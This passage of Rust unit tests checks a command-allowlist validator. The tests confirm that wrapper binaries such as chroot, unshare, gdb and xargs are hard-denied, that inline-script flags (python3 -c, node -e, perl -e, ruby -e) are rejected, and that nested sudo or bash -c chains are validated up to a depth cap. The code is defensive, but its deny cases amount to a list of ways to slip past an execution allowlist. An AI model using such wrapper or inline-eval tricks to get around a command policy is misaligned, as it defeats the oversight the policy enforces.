            ..ExecPolicy::default()
        };
        for w in &["time", "chroot", "unshare", "setsid", "stdbuf", "flock", "gdb"] {
            let cmd = format!("{w} ls");
            let err = validate_command_allowlist(&cmd, &p)
                .expect_err(&format!("{w} must be hard-denied"));
            assert!(err.contains("hard-denied"), "{w}: got: {err}");
        }
    }

    #[test]
    fn test_s908_python_dash_c_denied() {
        let p = wrapper_policy();
        let err = validate_command_allowlist("python3 -c \"import os\"", &p)
            .expect_err("python3 -c must be denied");
        assert!(err.contains("inline-script flag"), "got: {err}");
    }

    #[test]
    fn test_s908_python_script_file_passes() {
        let p = wrapper_policy();
        // python3 with a script file (no -c) is fine.
        assert!(validate_command_allowlist("python3 script.py", &p).is_ok());
    }

    #[test]
    fn test_s908_node_eval_flags_denied() {
        let p = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["node".into()],
            ..ExecPolicy::default()
        };
        for flag in &["-e", "--eval", "-p", "--print"] {
            let cmd = format!("node {flag} foo");
            assert!(
                validate_command_allowlist(&cmd, &p).is_err(),
                "node {flag} should be denied"
            );
        }
    }

    #[test]
    fn test_s908_perl_dash_e_denied() {
        let p = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["perl".into()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("perl -e foo", &p).is_err());
        assert!(validate_command_allowlist("perl -E foo", &p).is_err());
    }

    #[test]
    fn test_s908_ruby_dash_e_denied() {
        let p = ExecPolicy {
            mode: ExecSecurityMode::Allowlist,
            allowed_commands: vec!["ruby".into()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("ruby -e foo", &p).is_err());
    }

    #[test]
    fn test_s908_bash_c_sudo_inner_validates() {
        // bash -c "sudo ls" — bash is shell wrapper, inner script contains
        // sudo+ls. Must recurse into sudo and validate ls.
        let p = wrapper_policy();
        assert!(validate_command_allowlist("bash -c \"sudo ls\"", &p).is_ok());
        let err = validate_command_allowlist("bash -c \"sudo evil\"", &p)
            .expect_err("nested sudo evil must be rejected");
        assert!(err.contains("evil"), "got: {err}");
    }

    #[test]
    fn test_s908_bash_c_xargs_inside_denied() {
        // xargs hard-deny must fire even when nested inside a shell wrapper.
        let p = wrapper_policy();
        let err = validate_command_allowlist("bash -c \"xargs ls\"", &p)
            .expect_err("nested xargs must be denied");
        assert!(err.contains("hard-denied"), "got: {err}");
    }

    #[test]
    fn test_s908_wrapper_recursion_depth_cap() {
        // sudo → env → sudo → ls is depth 3 in wrapper-binary chain
        // (extract_wrapper_binary_chain starts at depth 1; nests bump it to
        // 2, then 3 > MAX_SHELL_RECURSION_DEPTH = 2 → reject).
        let p = wrapper_policy();
        let err = validate_command_allowlist("sudo env FOO=bar sudo ls", &p)
            .expect_err("depth-3 wrapper chain must be rejected");
        assert!(err.contains("depth cap"), "got: {err}");
    }

    #[test]
    fn test_s908_wrapper_without_inner_rejected() {
        let p = wrapper_policy();
        // `sudo` with no inner command must reject (fail-closed).
        assert!(validate_command_allowlist("sudo", &p).is_err());
        // `env` with only KEY=VALUE assignments and no inner command must reject.
        assert!(validate_command_allowlist("env FOO=bar", &p).is_err());
    }
}
